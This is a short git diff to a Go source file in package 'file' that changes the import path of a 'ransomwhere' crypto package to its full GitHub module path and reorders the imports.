@@ -1,8 +1,8 @@
 package file
 
 import (
+	"github.com/hazcod/ransomwhere/pkg/crypto"
 	"path/filepath"
-	"ransomwhere/pkg/crypto"
 	"strings"
 )
 
